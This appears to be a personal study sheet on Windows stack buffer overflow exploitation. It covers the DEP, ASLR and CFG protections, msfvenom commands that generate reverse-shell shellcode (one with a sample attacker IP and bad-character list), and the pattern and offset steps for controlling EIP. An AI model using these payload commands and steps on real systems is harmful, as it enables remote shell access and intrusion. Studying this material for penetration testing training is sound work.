---
Topics: Windows, BOF, MSFVenom
---
## Windows Buffer Overflows
> Tips & Tricks for exploiting a stack based buffer overflow on targets running Windows

#### Buffer Overflow Protection Mechanisms on Windows
- DEP -> Data Execution Protection
	- hardware/software that perform extra memory access checks to make sure code is not execution from data pages
- ASLR -> Address Space Layout Randomization
	- randomizes the base address of a program and it's DLL's every time it is loaded so that exploitation of a statis memory address is not feasible
	- This is not implemented on WinXP
- CFG -> Control-Flow Guard 
	- prevents code from branching and overwriting memory address pointers

### MSFVenom Shellcode Payloads
> ***Note***: A typical reverse shellcode takes about 300-400 bytes of memory to write to 
- standard shellcode payload -> rev shell: 
	- ```msfvenom -p windows/shell_reverse_tcp LHOST=[my ip] LPORT=443 -f -c```
- Shikata Ga Nai encoded payload to prevent bad characters from stopping overwrite: 
	- ```msfvenom -p windows/shell_reverse_tcp LHOST=[my ip] LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\list\of\bad\chars\hex"```
		- Example: 
			- ```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 EXITFUNC=thread LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"```

### Unique Pattern Generation for EIP Control
- faster and more reliable method than Binary Search Tree's, since only a single interation needs to  sent to the application
	- exact location of crash-causing buffer can be pinpointed this way
	- ```msf-create_pattern -l {bufferSize}``` can be used to generate a non-repeating unique string the same length as the crash-causing buffer
	- ```msf-pattern_offset-l {bufferSize} -q {valueInEIP}``` will determine the offset of the bytes that ended up in EIP for us just by entering the value that into the program
		- this value is going to be in hexademical but it is the representation of the actual string value at that location
	- from that point you would fill the buffer with random data up until the offset and then see if you can drop identifiable data into EIP
		- i.e. if the crash-casuing buffer size is 800 and the identified offset is 780, you would send 780 random chars and then try and drop 4 identifiable characters and fill the rest with garbage again. From there you would try to see if the hex representation of the identifiable string is present in EIP at the time of the crash

### Identifying Address Space for EIP redirection
- check the stack at crash time and see what ESP is pointing to and if that buffer has enough space to host reverse shellcode
	- if no, then increase the size of the crash causing buffer (relative to the space you need) and see if by increasing the size it changes the BOF condition or the nature of the BOF
	- 